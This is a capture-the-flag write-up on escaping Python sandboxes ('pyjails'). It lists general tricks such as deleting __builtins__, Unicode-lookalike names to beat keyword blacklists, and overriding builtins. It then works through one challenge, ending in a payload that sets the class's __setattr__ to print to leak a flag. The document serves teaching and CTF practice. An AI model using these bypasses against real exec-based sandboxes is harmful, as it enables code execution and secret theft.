# How easily solve a pyjail

Generally, by following this list you will be able to solve any pyjail and (maybe) quickly:
 - Check what you have available (`builtins`, `keywords`, global/local variables, internal attributes (`__subclasses__`, `__globals__`, `__self__`, `__builtins__`, `__spec__`))
 - Check if builtins can be overridden (also check if `__builtins__` can be overridden):
     - If this is possible, this can be useful: https://rszalski.github.io/magicmethods/
     - if you're able to reach the `__builtins__` module (not the dict), then you can override all builtins!
 - If the pyjail is built like this:
     ```py
     while True:
         code = input()
         assert "." not in code
         exec(code, {"__builtins__": {}})
     ```
     You can delete the current `__builtins__` in order to        restore them simply using `del __builtins__` (thanks @Loldemort). If `del` is not available, you can still delete `__builtins__` in [different ways](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md#deleting-a-variable)
 - Check how a blacklist is applied to the input:
     - If there is a content blacklist (eg. `assert 'exec' not in code`), you can try to bypass it using [Python Unicode Compatibility](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md#deleting-a-variable):
     ```py
     exec == 𝘦𝘹𝘦𝘤 == 𝙚𝓍𝓮𝘤
     ```

I'm using `The Impossible Escape` from `Srdnlen ctf 2023` as an example.

## Overview

Here's the source code of the challenge:
```py
class TIE:
    def __init__(self) -> None:
        print(banner)
        self.flag = getenv("FLAG", "srdnlen{REDACTED}")
        self.code = self.code_sanitizer(input("Submit your BEST (and perhaps only) Escape Plan: "))
        self.delete_flag()
        exec(self.code)

    def code_sanitizer(self, dirty_code: str) -> str:
        if not dirty_code.isascii():
            print("Alien material detected... Exiting.")
            exit()

        banned_letters = ["m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k", "g"]
        banned_symbols = ["}", "{", "[", "]", ":", "&", "`", "'", "-", "+", "\\", ".", "="]
        banned_words = ["flag", ]

        if any(map(lambda c: c in dirty_code, banned_letters + banned_symbols + banned_words)):
            print("Are you trying to cheat me!? Emergency exit in progress.")
            exit()

        cool_code = dirty_code.replace("\\t", "\t").replace("\\n", "\n")
        return cool_code

    def delete_flag(self) -> None:
        self.flag = "You cant grab me ;)"
        print("Too slow... what you were looking for has just been destroyed.")

```

The first thing you should do when solving a pyjail is getting a list of what you can use (you should run this at the end of the pyjail): 
```py
import builtins
import keyword
import string

banned_letters = ["m", "o", "w", "q", "b", "y", "u", "h", "c", "v", "z", "x", "k", "g"]
banned_symbols = ["}", "{", "[", "]", ":", "&", "`", "'", "-", "+", "\\", ".", "="]
banned_words = ["flag", ]


print("\n========= Allowed globals =========")
for w in list(globals()):
    if not any(map(lambda c: c in w, banned_letters + banned_symbols + banned_words)):
        print(w)

print("\n========= Allowed builtins =========")
for w in list(builtins.__dict__):
    if not any(map(lambda c: c in w, banned_letters + banned_symbols + banned_words)):
        print(w)


print("\n========= Allowed keywords =========")
for w in list(keyword.kwlist):
    if not any(map(lambda c: c in w, banned_letters + banned_symbols + banned_words)):
        print(w)

print("\n========= Allowed special chars =========")
for w in string.punctuation:
    if not any(map(lambda c: c in w, banned_letters + banned_symbols + banned_words)):
        print(w)

```

Output:


```py
========= Allowed globals =========
__file__
TIE

========= Allowed builtins =========
all
delattr
dir
id
iter
aiter
len
print
repr
setattr
Ellipsis
False
filter
int
list
set
str

========= Allowed keywords =========
False
and
as
assert
def
del
elif
else
if
in
is
pass
raise

========= Allowed special chars =========
!
"
#
$
%
(
)
*
,
/
;
<
>
?
@
^
_
|
~
```

So we're able to call functions, but we're not able to access attributes (we can't use `.`).

We se some interesting output:

```py
setattr
print
TIE
```

Using setattr, we can overwrite functions in order to print the flag... somehow...

Let's analyze this line:

```py
self.flag = getenv("FLAG", "srdnlen{REDACTED}")
```

Internally, Python calls the magic function `__setattr__` with the following parameters:
 - Attribute name (in our case, the attribute name is `'flag'`)
 - Attribute value (in our case, the value is our flag)

So if we overwrite the magic function `__setattr__` with `print`, we can print our flag.

We need to overwrite the function of `<class '__main__.TIE'>`, not its instance.
If we overwrite `__setattr__` of an instance of `TIE`, then our overwrite will not persist.

Final payload:

```py
setattr(TIE,'__setattr__',print);TIE() # Here we create another instance of TIE
```


Another example: https://pwnzer0tt1.it/posts/ez-class/
